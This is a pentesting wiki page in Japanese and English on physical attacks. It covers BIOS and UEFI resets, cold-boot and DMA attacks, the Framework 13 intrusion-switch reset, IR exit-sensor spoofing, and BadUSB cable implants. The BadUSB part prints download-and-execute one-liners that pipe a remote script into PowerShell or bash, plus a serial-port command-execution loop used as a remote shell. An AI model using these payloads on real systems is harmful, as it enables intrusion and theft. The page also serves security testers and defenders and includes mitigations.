# 物理攻撃

{{#include ../banners/hacktricks-training.md}}

## BIOS パスワード回復とシステムセキュリティ

**BIOS のリセット**は、いくつかの方法で行えます。ほとんどのマザーボードには、取り外して約**30分**放置するとパスワードを含むBIOS設定がリセットされる**バッテリー**が付属しています。あるいは、特定のピンを接続することでこれらの設定をリセットするために**マザーボード上のジャンパー**を調整することもできます。

ハードウェアの調整が不可能または実用的でない場合、**ソフトウェアツール**が解決策を提供します。**Live CD/USB**からシステムを起動し、**Kali Linux**のようなディストリビューションを使うと、**_killCmos_**や**_CmosPWD_**といったツールにアクセスでき、BIOSパスワードの回復を支援できます。

BIOSパスワードが不明な場合、誤って入力を**3回**行うと通常エラーコードが表示されます。このコードを[https://bios-pw.org](https://bios-pw.org)のようなサイトで使用すると、利用可能なパスワードを取得できる場合があります。

### UEFI セキュリティ

従来のBIOSの代わりに**UEFI**を採用している最新のシステムでは、ツール**chipsec**を使用してUEFI設定を解析・変更できます。これには**Secure Boot**の無効化も含まれます。以下のコマンドで実行できます：
```bash
python chipsec_main.py -module exploits.secure.boot.pk
```
---

## RAM 分析と Cold Boot Attacks

RAM は電源遮断後もしばらくデータを保持し、通常は**1 to 2 minutes**程度残ります。この持続時間は液体窒素のような低温物質を適用することで**10 minutes**まで延長できます。この延長された期間中に、**memory dump** を **dd.exe** や **volatility** のようなツールで作成して解析できます。

---

## Direct Memory Access (DMA) Attacks

**INCEPTION** は **physical memory manipulation** を DMA 経由で行うためのツールで、**FireWire** や **Thunderbolt** のようなインターフェースに対応しています。メモリをパッチして任意のパスワードを受け入れるようにすることでログイン手順をバイパスできます。ただし、**Windows 10** システムには効果がありません。

---

## Live CD/USB を使ったシステムアクセス

**_sethc.exe_** や **_Utilman.exe_** のようなシステムバイナリを **_cmd.exe_** のコピーに差し替えることで、システム特権のコマンドプロンプトを取得できます。**chntpw** のようなツールを使って Windows インストールの **SAM** ファイルを編集し、パスワードを変更することも可能です。

**Kon-Boot** は一時的に Windows カーネルや UEFI を改変してパスワードを知らなくても Windows にログインできるようにするツールです。詳細は [https://www.raymond.cc](https://www.raymond.cc/blog/login-to-windows-administrator-and-linux-root-account-without-knowing-or-changing-current-password/) を参照してください。

---

## Windows セキュリティ機能の扱い方

### ブートとリカバリのショートカット

- **Supr**: BIOS 設定にアクセスします。
- **F8**: リカバリモードに入ります。
- Windows バナーの後に **Shift** を押すと自動ログオンをバイパスできることがあります。

### BAD USB Devices

**Rubber Ducky** や **Teensyduino** のようなデバイスは **bad USB** デバイスを作成するためのプラットフォームとして機能し、ターゲットコンピュータに接続されると事前定義されたペイロードを実行できます。

### Volume Shadow Copy

管理者権限があれば PowerShell を通じて機密ファイル（**SAM** ファイルを含む）のコピーを作成できます。

## BadUSB / HID インプラント技術

### Wi-Fi managed cable implants

- ESP32-S3 ベースのインプラント（例: **Evil Crow Cable Wind**）は USB-A→USB-C や USB-C↔USB-C ケーブル内に隠れ、純粋に USB キーボードとして列挙され、C2 スタックを Wi‑Fi 経由で公開します。オペレータは被害者ホストからケーブルに電源を供給し、`Evil Crow Cable Wind` という名前でパスワード `123456789` のホットスポットを作成し、[http://cable-wind.local/](http://cable-wind.local/)（またはその DHCP アドレス）にブラウズするだけで組み込みの HTTP インターフェースにアクセスできます。
- ブラウザ UI は *Payload Editor*, *Upload Payload*, *List Payloads*, *AutoExec*, *Remote Shell*, *Config* といったタブを提供します。保存されたペイロードは OS ごとにタグ付けされ、キーボードレイアウトはその場で切り替えられ、VID/PID 文字列を既知の周辺機器に見せかけるよう変更できます。
- C2 がケーブル内に存在するため、電話でペイロードを配置・実行トリガー・Wi‑Fi 資格情報の管理ができ、ホスト OS に触れることなく操作可能です — 短時間の物理侵入に最適です。

### OS-aware AutoExec payloads

- AutoExec ルールは 1 つ以上のペイロードを USB 列挙直後に即時実行するようバインドします。インプラントは軽量な OS フィンガープリンティングを行い、一致するスクリプトを選択します。
- 例:
- *Windows:* `GUI r` → `powershell.exe` → `STRING powershell -nop -w hidden -c "iwr http://10.0.0.1/drop.ps1|iex"` → `ENTER`.
- *macOS/Linux:* `COMMAND SPACE` (Spotlight) または `CTRL ALT T` (terminal) → `STRING curl -fsSL http://10.0.0.1/init.sh | bash` → `ENTER`.
- 実行が無人で行われるため、単に充電ケーブルを差し替えるだけでログオン中のユーザコンテキスト下で「plug-and-pwn」な初期アクセスを達成できます。

### HID-bootstrapped remote shell over Wi-Fi TCP

1. **Keystroke bootstrap:** 保存されたペイロードはコンソールを開き、新しい USB serial device 上に到着するものを実行するループを貼り付けます。最小限の Windows バリアントは:
```powershell
$port=New-Object System.IO.Ports.SerialPort 'COM6',115200,'None',8,'One'
$port.Open(); while($true){$cmd=$port.ReadLine(); if($cmd){Invoke-Expression $cmd}}
```
2. **Cable bridge:** インプラントはUSB CDCチャネルを開いたままにし、そのESP32-S3がオペレーター側へTCP client（Python script, Android APK, or desktop executable）を起動します。TCPセッションに入力されたバイトは上記のシリアルループへ転送され、air-gappedホスト上でもremote command executionを可能にします。出力は限られるため、オペレーターは通常blind commands（アカウント作成、追加ツールのステージング等）を実行します。

### HTTP OTA 更新インターフェース

- 同じweb stackは通常、認証なしのファームウェア更新を公開します。Evil Crow Cable Windは`/update`を監視し、アップロードされたバイナリをそのままフラッシュします：
```bash
curl -F "file=@firmware.ino.bin" http://cable-wind.local/update
```
- フィールドオペレーターは、ケーブルを開けずにエンゲージメント中に機能をホットスワップできる（例: flash USB Army Knife firmware）。これにより、implant はターゲットホストに接続したまま新しい機能へピボットできる。

## Bypassing BitLocker Encryption

BitLocker 暗号化は、**recovery password** がメモリダンプファイル（**MEMORY.DMP**）内に見つかった場合、バイパスされる可能性がある。**Elcomsoft Forensic Disk Decryptor** や **Passware Kit Forensic** といったツールをこの目的で利用できる。

---

## Social Engineering for Recovery Key Addition

ソーシャルエンジニアリングにより、BitLocker の recovery key を追加させることができる。ユーザーにゼロで構成された新しい recovery key を追加するコマンドを実行させれば、復号プロセスを簡略化できる。

---

## Exploiting Chassis Intrusion / Maintenance Switches to Factory-Reset the BIOS

多くの最新ラップトップや小型デスクトップには、Embedded Controller (EC) や BIOS/UEFI ファームウェアで監視される **chassis-intrusion switch** が搭載されている。スイッチの主目的はデバイスが開かれた際のアラート発生だが、ベンダーは特定のパターンでスイッチが切り替えられたときに発動する **undocumented recovery shortcut** を実装していることがある。

### How the Attack Works

1. スイッチは EC 上の **GPIO interrupt** に配線されている。
2. EC 上で動作するファームウェアは **タイミングと押下回数** を記録している。
3. ハードコードされたパターンが認識されると、EC は *mainboard-reset* ルーチンを呼び出し、**system NVRAM/CMOS の内容を消去する**。
4. 次回起動時に BIOS はデフォルト値を読み込む – **supervisor password, Secure Boot keys, and all custom configuration are cleared**。

> 一旦 Secure Boot が無効化され、firmware password が消えると、攻撃者は外部の任意の OS イメージをブートして内部ドライブへ無制限にアクセスできるようになる。

### Real-World Example – Framework 13 Laptop

The recovery shortcut for the Framework 13 (11th/12th/13th-gen) is:
```text
Press intrusion switch  →  hold 2 s
Release                 →  wait 2 s
(repeat the press/release cycle 10× while the machine is powered)
```
After the tenth cycle the EC sets a flag that instructs the BIOS to wipe NVRAM at the next reboot.  The whole procedure takes ~40 s and requires **ドライバーだけで済む**。

### Generic Exploitation Procedure

1. Power-on or suspend-resume the target so the EC is running.
2. Remove the bottom cover to expose the intrusion/maintenance switch.
3. Reproduce the vendor-specific toggle pattern (consult documentation, forums, or reverse-engineer the EC firmware).
4. Re-assemble and reboot – firmware protections should be disabled.
5. Boot a live USB (e.g. Kali Linux) and perform usual post-exploitation (credential dumping, data exfiltration, implanting malicious EFI binaries, etc.).

### Detection & Mitigation

* OS管理コンソールにchassis-intrusionイベントを記録し、予期しないBIOSリセットと相関させる。
* ネジやカバーに**改ざん防止シール**を用いて開封を検出する。
* デバイスは**物理的に管理された場所**に保管すること。物理アクセスがあれば完全な妥協を想定する。
* 可能であればベンダーの“maintenance switch reset”機能を無効化するか、NVRAMリセットに対して追加の暗号認証を要求する。

---

## Covert IR Injection Against No-Touch Exit Sensors

### Sensor Characteristics
- Commodity “wave-to-exit” sensors pair a near-IR LED emitter with a TV-remote style receiver module that only reports logic high after it has seen multiple pulses (~4–10) of the correct carrier (≈30 kHz).
- A plastic shroud blocks the emitter and receiver from looking directly at each other, so the controller assumes any validated carrier came from a nearby reflection and drives a relay that opens the door strike.
- Once the controller believes a target is present it often changes the outbound modulation envelope, but the receiver keeps accepting any burst that matches the filtered carrier.

### Attack Workflow
1. **Capture the emission profile** – clip a logic analyser across the controller pins to record both the pre-detection and post-detection waveforms that drive the internal IR LED.
2. **Replay only the “post-detection” waveform** – remove/ignore the stock emitter and drive an external IR LED with the already-triggered pattern from the outset. Because the receiver only cares about pulse count/frequency, it treats the spoofed carrier as a genuine reflection and asserts the relay line.
3. **Gate the transmission** – transmit the carrier in tuned bursts (e.g., tens of milliseconds on, similar off) to deliver the minimum pulse count without saturating the receiver’s AGC or interference handling logic. Continuous emission quickly desensitises the sensor and stops the relay from firing.

### Long-Range Reflective Injection
- Replacing the bench LED with a high-power IR diode, MOSFET driver, and focusing optics enables reliable triggering from ~6 m away.
- The attacker does not need line-of-sight to the receiver aperture; aiming the beam at interior walls, shelving, or door frames that are visible through glass lets reflected energy enter the ~30° field of view and mimics a close-range hand wave.
- Because the receivers expect only weak reflections, a much stronger external beam can bounce off multiple surfaces and still remain above the detection threshold.

### Weaponised Attack Torch
- Embedding the driver inside a commercial flashlight hides the tool in plain sight. Swap the visible LED for a high-power IR LED matched to the receiver’s band, add an ATtiny412 (or similar) to generate the ≈30 kHz bursts, and use a MOSFET to sink the LED current.
- A telescopic zoom lens tightens the beam for range/precision, while a vibration motor under MCU control gives haptic confirmation that modulation is active without emitting visible light.
- Cycling through several stored modulation patterns (slightly different carrier frequencies and envelopes) increases compatibility across rebranded sensor families, letting the operator sweep reflective surfaces until the relay audibly clicks and the door releases.

---

## References

- [Pentest Partners – “Framework 13. Press here to pwn”](https://www.pentestpartners.com/security-blog/framework-13-press-here-to-pwn/)
- [FrameWiki – Mainboard Reset Guide](https://framewiki.net/guides/mainboard-reset)
- [SensePost – “Noooooooo Touch! – Bypassing IR No-Touch Exit Sensors with a Covert IR Torch”](https://sensepost.com/blog/2025/noooooooooo-touch/)
- [Mobile-Hacker – “Plug, Play, Pwn: Hacking with Evil Crow Cable Wind”](https://www.mobile-hacker.com/2025/12/01/plug-play-pwn-hacking-with-evil-crow-cable-wind/)

{{#include ../banners/hacktricks-training.md}}
